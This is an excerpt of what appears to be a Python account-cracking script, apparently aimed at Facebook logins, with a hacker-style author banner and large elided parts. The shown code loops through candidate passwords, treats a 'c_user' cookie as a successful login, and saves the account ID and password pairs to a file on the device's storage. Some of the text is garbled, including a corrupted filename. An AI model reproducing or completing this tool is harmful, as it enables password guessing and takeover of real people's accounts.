...
redmi=[]
try:
 print('\033[32;1m𝐰𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 𝐬𝐤 𝐬𝐮𝐲𝐚𝐢𝐟 𝐭𝐨𝐨𝐥𝐬')
...
---------------------------------------------
\033[1;33m Author    : kallan
\033[1;32m Github    : kallan
\033[1;31m Facebook  : kallan mitro haker 
\033[1;35m Type type : FREE
\033[1;36m Version   : 1.0
----------------------------------------------""")
    print(f"""{GREEN}    𝐰𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 𝐬𝐤 𝐬𝐮𝐲𝐚𝐢𝐟 𝐭𝐨𝐨𝐥𝐬{P}
 ...
 try:
  for ps in pw:
   ...
   if 'c_user' in log_cookies:
    ...
    open(' /sdcard/𝐒??𝐘𝐀𝐈𝐅-CP.txt','a').write(idf+'|'+ps+'|'+'\n')
    cp.append(idf)
   else:
    continue
  loop+=1
